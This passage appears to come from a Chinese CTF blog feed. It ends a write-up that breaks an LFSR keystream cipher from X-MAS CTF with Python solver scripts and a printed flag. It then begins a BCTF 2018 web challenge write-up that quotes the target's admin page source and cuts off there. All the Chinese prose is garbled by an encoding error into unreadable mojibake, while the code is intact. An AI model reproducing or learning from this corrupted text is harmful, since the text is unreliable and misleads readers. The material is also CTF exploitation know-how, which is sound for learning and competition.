ä¸ªæ¯”ç‰¹ã€‚</p><p>å½“ä¸‹ä¸€æ¬¡ç”Ÿæˆå­—èŠ‚çš„æ—¶å€™ï¼Œiv å› ä¸ºå‘ç”Ÿäº†å˜åŒ–ï¼Œå˜åŒ–åçš„ iv_new[2]â€”iv_new[32] è¿™ 31 ä½æ˜¯ä¹‹å‰ iv[1]â€”iv[31] è¿™31 ä½ï¼ˆå› ä¸ºå³ç§»äº†ä¸€ä½ï¼‰ï¼Œè€Œ iv_new[1]æ˜¯ 0ï¼Œå¯èƒ½æ–°çš„ iv æœ‰ 33 ä½ï¼Œä½†é‚£ä¸ªæœ€é«˜ä½å¹¶æ²¡æœ‰å‚ä¸åˆ°å­—èŠ‚çš„ç”Ÿæˆä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦ç®¡ã€‚æ­¤æ—¶ç”Ÿæˆå­—èŠ‚çš„å›¾æ˜¯ï¼š</p><table><thead><tr><th></th><th>0</th><th>i[1]</th><th>i[2]</th><th>i[3]</th><th>i[4]</th><th>i[5]</th><th>i[6]</th><th>i[7]</th></tr></thead><tbody><tr><td>xor</td><td>i[8]</td><td>i[9]</td><td>i[10]</td><td>i[11]</td><td>i[12]</td><td>i[13]</td><td>i[14]</td><td>i[15]</td></tr><tr><td>xor</td><td>i[16]</td><td>i[17]</td><td>i[18]</td><td>i[19]</td><td>i[20]</td><td>i[21]</td><td>i[22]</td><td>i[23]</td></tr><tr><td>xor</td><td>i[24]</td><td>i[25]</td><td>i[26]</td><td>i[27]</td><td>i[28]</td><td>i[29]</td><td>i[30]</td><td>i[31]</td></tr><tr><td>xor</td><td>m[1]</td><td>m[2]</td><td>m[3]</td><td>m[4]</td><td>m[5]</td><td>m[6]</td><td>m[7]</td><td>m[8]</td></tr><tr><td>xor</td><td>m[9]</td><td>m[10]</td><td>m[11]</td><td>m[12]</td><td>m[13]</td><td>m[14]</td><td>m[15]</td><td>m[16]</td></tr><tr><td>xor</td><td>m[17]</td><td>m[18]</td><td>m[19]</td><td>m[20]</td><td>m[21]</td><td>m[22]</td><td>m[23]</td><td>m[24]</td></tr><tr><td>xor</td><td>m[25]</td><td>m[26]</td><td>m[27]</td><td>m[28]</td><td>m[29]</td><td>m[30]</td><td>m[31]</td><td>m[32]</td></tr></tbody></table><p>è¿™ä¸ªå›¾ä¸­çš„ i[1] å’Œä¸Šä¸€ä¸ªå›¾ä¸­çš„ i[1] è¡¨ç¤ºçš„å«ä¹‰å®Œå…¨ç›¸åŒï¼Œå°±æ˜¯åˆå§‹çš„ iv ä½32æ¯”ç‰¹ä¸­ä»é«˜åˆ°ä½çš„ç¬¬ä¸€ä¸ªæ¯”ç‰¹ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå‰å››è¡Œå¼‚æˆ–çš„ç»“æœï¼Œå’Œä¸Šä¸€ä¸ªå›¾ä¸­å‰å››è¡Œå¼‚æˆ–çš„ç»“æœï¼Œæœ‰ <strong>7</strong> ä½éƒ½æ˜¯ç›¸åŒçš„ï¼Œç›¸å½“äºç»“æœå³ç§»äº†ä¸€ä½ï¼Œåœ¨å‰é¢åˆè¡¥äº†ä¸€ä½ã€‚ä½†æ˜¯ mask å’Œ iv çš„å¼‚æˆ–å¯¹åº”å…³ç³»è¢«æ‰“ä¹±äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ¢ä¸€ç§æ€è·¯æƒ³ï¼Œè™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“ mask çš„å…·ä½“ 32 ä¸ªæ¯”ç‰¹ï¼Œä½†æ˜¯æœ‰ç”¨çš„åªæœ‰å…«ä¸ªæ¯”ç‰¹ï¼Œå°±æ˜¯åå››è¡Œå¼‚æˆ–çš„ç»“æœã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡å·²çŸ¥çš„å…­ä¸ªå­—ç¬¦æ˜æ–‡<code>X-MAS&#123;</code>å’Œå®Œæ•´å¯†æ–‡æ¥ç®—å‡ºè¿™å…«ä¸ªæ¯”ç‰¹ã€‚è‡³äºå‰å››è¡Œå¼‚æˆ–çš„ç»“æœï¼Œç›¸å½“äºä¸€ä¸ª LFSRï¼Œå³ç§»ä¸€ä½ï¼ŒåŒæ—¶å‰é¢è¡¥ä½ã€‚</p><h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><p>æˆ‘ä»¬æœ‰äº†æ˜æ–‡çš„å‰å…­ä¸ªå­—ç¬¦<code>X-MAS&#123;</code>ä»¥åŠå¯†æ–‡ï¼Œå¯ä»¥å¾—åˆ°ç”Ÿæˆçš„å‰ 6 ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹å‰é¢åˆ†æçš„æ˜¯å¦æ­£ç¡®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(c[<span class="number">6</span>:])</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    byte.append(<span class="built_in">ord</span>(c[i])^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span> byte</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(byte[<span class="number">0</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==<span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="built_in">print</span> i,<span class="built_in">bin</span>(byte[<span class="number">0</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),<span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°è¾“å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 10111011 01011101</span><br><span class="line">183 01000100 10100010</span><br></pre></td></tr></table></figure><p>ç¨‹åºé‡Œçš„ i å°±æ˜¯è¡¨æ ¼ä¸­åé¢ 4 è¡Œå¼‚æˆ–çš„ç»“æœï¼Œæ˜¯ä¸¤ä¸ªâ€¦ æˆ‘ä»¬å†è°ƒæ•´ä¸€ä¸‹ï¼ŒæŠŠåˆ¤æ–­æ¡ä»¶é‡Œçš„ byte[0] å’Œ byte[1] æ”¹æˆbyte[1] å’Œ byte[2]ï¼Œçœ‹çœ‹ç»“æœä¸€æ ·ä¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    byte.append(<span class="built_in">ord</span>(c[i])^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span> byte                                  <span class="comment">#ç”Ÿæˆçš„å­—èŠ‚</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==<span class="built_in">bin</span>(byte[<span class="number">2</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="built_in">print</span> i,<span class="built_in">bin</span>(byte[<span class="number">1</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),<span class="built_in">bin</span>(byte[<span class="number">2</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 01011101 10101110</span><br><span class="line">183 10100010 01010001</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯ 72 å’Œ183 ï¼ŒéªŒè¯äº†æˆ‘ä»¬ä¹‹å‰çš„åˆ†ææ—¶æ­£ç¡®çš„ã€‚</p><p>è¿™æ ·æˆ‘ä»¬è§£é¢˜æ€è·¯å°±æ¸…æ™°äº†ï¼Œå¾—åˆ°äº†å®é™…æœ‰ç”¨çš„ â€œmaskâ€,æˆ‘ä»¬åªéœ€è¦æ¯æ¬¡ç§»ä½çš„æ—¶å€™ï¼Œæœ€é«˜ä½å¡« 0 å’Œ 1 éƒ½è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹å“ªä¸ªè§£å¯†èƒ½å¾—åˆ°æ­£å¸¸çš„å­—ç¬¦ã€‚ç„¶åå¡«å……æ­£ç¡®çš„æ¯”ç‰¹ï¼Œå¾ªç¯å¾—åˆ°å…¨éƒ¨ flagã€‚</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>æˆ‘ä»¬éœ€è¦å¾—åˆ°ç”Ÿæˆç¬¬ 6 ä¸ªå­—èŠ‚åçš„çŠ¶æ€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">byte=[]</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    byte.append(<span class="built_in">ord</span>(c[i])^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span> byte                                  <span class="comment">#ç”Ÿæˆçš„å­—èŠ‚</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bin</span>(byte[<span class="number">4</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[:<span class="number">7</span>]==<span class="built_in">bin</span>(byte[<span class="number">5</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[<span class="number">-7</span>:]:</span><br><span class="line">        <span class="built_in">print</span> i,<span class="built_in">bin</span>(byte[<span class="number">4</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>),<span class="built_in">bin</span>(byte[<span class="number">5</span>]^i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[243, 21, 230, 159, 163, 61]</span><br><span class="line">72 11101011 01110101</span><br><span class="line">183 00010100 10001010</span><br></pre></td></tr></table></figure><p>å¦‚æœé€‰ç”¨ 72 ä½œä¸ºæœ‰æ•ˆ maskï¼Œæ­¤æ—¶çŠ¶æ€æ˜¯ <code>01110101</code></p><p>å†™å‡º exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#written by R1sker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">list</span>=string.ascii_letters+string.digits+<span class="string">&quot;_&quot;</span>+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR1</span>(<span class="params">iv</span>):</span></span><br><span class="line">    <span class="keyword">return</span> iv &gt;&gt; <span class="number">1</span> | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR0</span>(<span class="params">iv</span>):</span></span><br><span class="line">    <span class="keyword">return</span> iv &gt;&gt; <span class="number">1</span> | (<span class="number">0</span> &lt;&lt; <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>).read().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">flag=<span class="string">&quot;X-MAS&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">mask=<span class="number">72</span></span><br><span class="line">s=<span class="number">0b01110101</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> c[<span class="number">6</span>:]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)^mask^LFSR1(s)) <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        s=LFSR1(s)</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(j)^mask^s)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)^mask^LFSR0(s)) <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        s=LFSR0(s)</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j) ^ mask ^ s)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-450e0033c231ceb1.png" alt="image.png"></p><blockquote><p>X-MAS{S4n7a_4lw4ys_g1ve5_n1c3_pr3s3n7s}</p></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>Crypto çœŸå¥½ç©ï¼Œæ»šå»å­¦ Web äº†ï¼Œæ¯•ç«Ÿè¿˜æ˜¯ä¸€åª Web ç‹—ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 XCTF-BCTF SEAFARING</title>
      <link href="/2018/12/12/2018-XCTF-BCTF-SEAFARING/"/>
      <url>/2018/12/12/2018-XCTF-BCTF-SEAFARING/</url>
      
        <content type="html"><![CDATA[<p>11æœˆæ‰“äº†å‡ åœºçº¿ä¸‹ï¼Œå›æ¥å°±åšäº†åš BCTF çš„é¢˜ï¼Œæ— å¥ˆè‡ªå·±æ°´å¹³ä¸å¤Ÿï¼Œé¢˜ç›®è´¨é‡ä¹Ÿå¾ˆé«˜ï¼Œåšäº†åŠå¤©è¿˜æ˜¯æ²¡æ‘¸åˆ°ä»€ä¹ˆé—¨è·¯ï¼Œå‰ç«¯å¤ªå·®ã€‚</p><a id="more"></a><p>çœ‹ä¸€ä¸‹ BCTF çš„ Web è§£é¢˜æƒ…å†µå°±äº†è§£äº†é¢˜çš„éš¾åº¦2333ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7dd8115fe2774196.png" alt="image.png"></p><p>ç”±äºå„ç§äº‹æƒ…åŠ ä¸Šæ‘¸é±¼æ‘¸äº†ä¸€æ®µæ—¶é—´ï¼Œç°åœ¨æ‰æ¥å¤ç°ä¸€ä¸‹ BCTF çš„é¢˜ï¼Œå°è¥¿å¸ˆå‚…å‡ºçš„é¢˜æœ‰ä¸¶éš¾ï¼Œè¦å¥½å¥½å­¦ä¸‹å‰ç«¯äº†â€¦</p><p>SEAFARING è¿™ä¸¤é“é¢˜ï¼Œå°è¥¿å¸ˆå‚…çš„å‡ºé¢˜åˆ†äº«åŠ dockerï¼š<a href="http://momomoxiaoxi.com/ctf/2018/12/01/BCTF2018seafaring/">http://momomoxiaoxi.com/ctf/2018/12/01/BCTF2018seafaring/</a></p><p>é¢˜ç›®è¿˜åœ¨å°è¥¿çš„æœåŠ¡å™¨ä¸Šå¼€ç€ï¼Œåœ°å€ï¼š<a href="http://ctf.momomoxiaoxi.com:9999">http://ctf.momomoxiaoxi.com:9999</a></p><h3 id="SEAFARING1"><a href="#SEAFARING1" class="headerlink" title="SEAFARING1"></a>SEAFARING1</h3><p>åšè¿™ä¸ªé¢˜çš„æ—¶å€™å¼€å§‹ä¸€ç›´ä»¥ä¸ºç•™è¨€å¤„æœ‰ xssï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œå‘ç°äº† <code>/admin/handle_message.php</code> ä¸ä¼šåˆ©ç”¨ï¼Œå¤ªèœäº†ã€‚</p><p>å…¶å®ç•™è¨€å¤„æœ‰ä¸ª botï¼Œä¼šè®¿é—®æŒ‡å®šçš„åœ°å€ã€‚è€Œ robots.txt ä¸­ <code>/admin/handle_message.php</code>æ³„éœ²äº†ä¸€äº› apiï¼š</p><p>admin/index.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- for-mobile-apps --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Seafaring Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template,</span></span></span><br><span class="line"><span class="tag"><span class="string">Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/x-javascript&quot;</span>&gt;</span><span class="javascript"> addEventListener(<span class="string">&quot;load&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">setTimeout</span>(hideURLbar, <span class="number">0</span>); &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">hideURLbar</span>(<span class="params"></span>)</span>&#123; <span class="built_in">window</span>.scrollTo(<span class="number">0</span>,<span class="number">1</span>); &#125; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- //for-mobile-apps --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;../css/bootstrap.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;../css/style.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- js --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/jquery-1.11.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- //js --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- FlexSlider --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../css/flexslider.css&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;screen&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;../js/jquery.flexslider.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> csrf_token = <span class="string">&quot;ed8aa8fdd1ca7988655509779e0ab120&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="built_in">window</span>).load(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">&#x27;.flexslider&#x27;</span>).flexslider(&#123;</span></span><br><span class="line"><span class="javascript">animation: <span class="string">&quot;slide&quot;</span>,</span></span><br><span class="line"><span class="javascript">start: <span class="function"><span class="keyword">function</span>(<span class="params">slider</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">&#x27;body&#x27;</span>).removeClass(<span class="string">&#x27;loading&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">view_uid</span>(<span class="params">uid</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            type: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="javascript">            url: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            data: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_uid&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid&#125;,</span></span><br><span class="line"><span class="javascript">            dataType: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span></span><br><span class="line"><span class="javascript">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> Status = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">&#x27;#timestamp&#x27;</span>).text(data[<span class="string">&#x27;timestamp&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">&#x27;#username&#x27;</span>).text(data[<span class="string">&#x27;user_name&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">&#x27;#message&#x27;</span>).text(data[<span class="string">&#x27;message&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.getElementById(<span class="string">&quot;replyuid&quot;</span>).value=data[<span class="string">&#x27;uid&#x27;</span>];</span></span><br><span 